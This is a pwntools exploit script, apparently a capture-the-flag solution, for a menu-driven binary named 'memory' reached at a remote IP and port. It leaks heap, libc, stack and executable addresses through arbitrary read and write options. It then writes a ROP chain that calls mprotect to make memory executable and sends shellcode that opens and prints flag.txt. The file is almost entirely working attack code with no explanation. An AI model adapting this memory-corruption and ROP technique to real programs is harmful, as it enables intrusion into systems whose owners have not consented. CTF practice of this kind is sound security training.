#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 20.216.39.14 --port 1235 memory
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('memory')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '20.216.39.14'
port = int(args.PORT or 1235)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

libc = ELF('libc.so.6')

io = start()

io.sendlineafter(b">> ", b"3")
io.sendlineafter(b">> ", b"8")
io.recvuntil(b">> ")

io.sendlineafter(b">> ", b"5")
heap = unpack(io.recvuntil(b"\n1) read\n", drop=True).ljust(8, b'\x00')) - 0x22a0
io.info("HEAP: " + hex(heap))

count = heap + 0x2a0
io.sendlineafter(b">> ", b"2")
io.sendlineafter(b">> ", format(count, 'x').encode())
io.sendlineafter(b">> ", b'8' + b'0'*7)

io.sendlineafter(b">> ", b"1")
io.sendlineafter(b">> ", format(heap + 0x320, 'x').encode())
libc.address = int(io.recvline(), 0) - 0x212ca0
io.info("LIBC: " + hex(libc.address))

io.sendlineafter(b">> ", b"1")
io.sendlineafter(b">> ", format(libc.address + 0x1f1190, 'x').encode())
rbp = int(io.recvline(), 0) - 0xf8
io.info("RBP: " + hex(rbp))

io.sendlineafter(b">> ", b"1")
io.sendlineafter(b">> ", format(rbp - 0x18, 'x').encode())
exe.address = int(io.recvline(), 0) - 0x1794
io.info("EXE: " + hex(exe.address))

rwx = libc.address + 0x1eb000

rop = ROP(libc)
rop.mprotect(rwx, 0x2000, 7)
rop.read(0, rwx, 0x1000)
rop.raw(rwx)
print(rop.dump())

chain = rop.chain()
nextqwordaddr = rbp
for qword in [chain[i: i + 4] for i in range(0, len(chain), 4)]:
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b">> ", format(nextqwordaddr, 'x').encode())
    io.sendlineafter(b">> ", format(u32(qword), 'x').encode())
    io.info("wrote to " + hex(nextqwordaddr))
    nextqwordaddr += 0x4

io.sendlineafter(b">> ", b"2")
io.sendlineafter(b">> ", format(rbp - 0x18, 'x').encode())
io.sendlineafter(b">> ", format(ROP(exe).find_gadget(['pop r14', 'pop r15', 'ret'])[0], 'x').encode())

string_addr = rwx + 0x1000

shellcode  = asm(shellcraft.read(0, string_addr, 100))
shellcode += asm(shellcraft.open(string_addr, 0))
shellcode += asm(shellcraft.read('rax', string_addr, 100))
shellcode += asm(shellcraft.write(1, string_addr, 100))

sleep(1)
io.send(shellcode)

sleep(1)
io.send(b"flag.txt")

io.interactive()
